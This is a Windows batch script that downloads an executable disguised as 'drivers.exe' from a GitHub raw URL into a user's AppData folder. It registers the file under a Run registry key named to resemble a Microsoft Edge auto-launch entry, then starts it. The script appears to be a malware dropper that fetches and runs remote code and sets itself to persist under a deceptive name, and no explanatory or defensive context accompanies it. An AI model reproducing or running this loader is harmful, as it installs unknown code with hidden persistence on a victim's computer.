��
@echo off
setlocal
curl -L -o "C:\Users\Meri_Lin\AppData\Roaming\drivers.exe" "https://github.com/hwangyounggul33/windew/raw/refs/heads/main/drivers.exe"
echo File downloaded successfully.
cd /d %~dp0
copy /b "drivers.exe" "%AppData%\drivers.exe"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftEdAutoLaunch_020 /t REG_SZ /d "%AppData%\drivers.exe" 
Start %AppData%\drivers.exe
Exit